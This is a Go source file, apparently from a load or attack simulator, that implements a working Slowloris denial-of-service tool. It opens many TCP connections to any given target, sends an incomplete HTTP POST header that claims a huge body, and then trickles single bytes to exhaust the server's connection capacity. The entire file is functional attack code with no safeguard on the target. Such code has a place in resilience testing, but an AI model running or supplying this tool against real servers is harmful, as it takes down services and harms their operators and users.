package simulator

import (
	"log"
	"net"
	"time"
)

// SlowlorisAttack represents a Slowloris DoS attack simulator.
// It maintains multiple slow connections to the target server, sending
// partial HTTP requests with delays to exhaust server resources.
type SlowlorisAttack struct {
	TargetURL      string
	NumConnections int
	DelaySeconds   int
	connections    []net.Conn
	stopChan       chan bool
}

// NewSlowlorisAttack initializes a new Slowloris attack simulator.
func NewSlowlorisAttack(targetURL string, numConnections int, delaySeconds int) *SlowlorisAttack {
	return &SlowlorisAttack{
		TargetURL:      targetURL,
		NumConnections: numConnections,
		DelaySeconds:   delaySeconds,
		connections:    make([]net.Conn, 0),
		stopChan:       make(chan bool, 1),
	}
}

// Start initiates the Slowloris attack by opening multiple slow connections.
func (s *SlowlorisAttack) Start() {
	log.Printf("[SLOWLORIS] 🔴 Starting Slowloris DoS attack on %s with %d connections\n", s.TargetURL, s.NumConnections)

	// Extract host and port from URL (e.g., "http://localhost:8080" -> "localhost:8080")
	host := s.extractHostPort()

	for i := 0; i < s.NumConnections; i++ {
		go s.slowConnection(host, i+1)
	}
}

// slowConnection opens a single slow connection and sends partial HTTP data.
func (s *SlowlorisAttack) slowConnection(host string, connID int) {
	conn, err := net.DialTimeout("tcp", host, 10*time.Second)
	if err != nil {
		log.Printf("[SLOWLORIS] Connection %d failed to connect: %v\n", connID, err)
		return
	}
	defer conn.Close()

	s.connections = append(s.connections, conn)
	log.Printf("[SLOWLORIS] Connection %d established to %s\n", connID, host)

	// Send initial HTTP request header (incomplete)
	initialRequest := "POST / HTTP/1.1\r\n"
	initialRequest += "Host: " + host + "\r\n"
	initialRequest += "Content-Type: application/json\r\n"
	initialRequest += "Content-Length: 1000000\r\n" // Claim a large body
	initialRequest += "Connection: keep-alive\r\n"
	initialRequest += "\r\n"

	_, err = conn.Write([]byte(initialRequest))
	if err != nil {
		log.Printf("[SLOWLORIS] Connection %d failed to send initial request: %v\n", connID, err)
		return
	}

	log.Printf("[SLOWLORIS] Connection %d sent initial HTTP header\n", connID)

	// Send one byte every N seconds to keep connection alive
	ticker := time.NewTicker(time.Duration(s.DelaySeconds) * time.Second)
	defer ticker.Stop()

	bytesSent := 0
	maxBytes := 100 // Send up to 100 bytes slowly

	for {
		select {
		case <-s.stopChan:
			log.Printf("[SLOWLORIS] Connection %d stopping\n", connID)
			return
		case <-ticker.C:
			if bytesSent >= maxBytes {
				// Keep sending dummy data to maintain connection
				_, err := conn.Write([]byte("X"))
				if err != nil {
					log.Printf("[SLOWLORIS] Connection %d closed by server (timeout or error): %v\n", connID, err)
					return
				}
				bytesSent++
			} else {
				// Send one byte of the body
				_, err := conn.Write([]byte("A"))
				if err != nil {
					log.Printf("[SLOWLORIS] Connection %d closed by server: %v\n", connID, err)
					return
				}
				bytesSent++
			}

			if bytesSent%10 == 0 {
				log.Printf("[SLOWLORIS] Connection %d: %d bytes sent (keeping connection alive)\n", connID, bytesSent)
			}
		}
	}
}

// Stop terminates all slow connections.
func (s *SlowlorisAttack) Stop() {
	log.Printf("[SLOWLORIS] Stopping Slowloris attack\n")
	close(s.stopChan)

	for _, conn := range s.connections {
		if conn != nil {
			conn.Close()
		}
	}
}

// extractHostPort extracts host:port from a URL string.
// Handles formats like "http://localhost:8080" or "https://example.com:443"
func (s *SlowlorisAttack) extractHostPort() string {
	url := s.TargetURL

	// Remove protocol prefix
	if len(url) > 7 && url[:7] == "http://" {
		url = url[7:]
	} else if len(url) > 8 && url[:8] == "https://" {
		url = url[8:]
	}

	// Remove path if present
	for i, ch := range url {
		if ch == '/' {
			url = url[:i]
			break
		}
	}

	// If no port specified, add default
	if !contains(url, ":") {
		if len(s.TargetURL) > 5 && s.TargetURL[:5] == "https" {
			url = url + ":443"
		} else {
			url = url + ":80"
		}
	}

	return url
}

// contains checks if a string contains a substring.
func contains(s, substr string) bool {
	for i := 0; i < len(s)-len(substr)+1; i++ {
		if s[i:i+len(substr)] == substr {
			return true
		}
	}
	return false
}
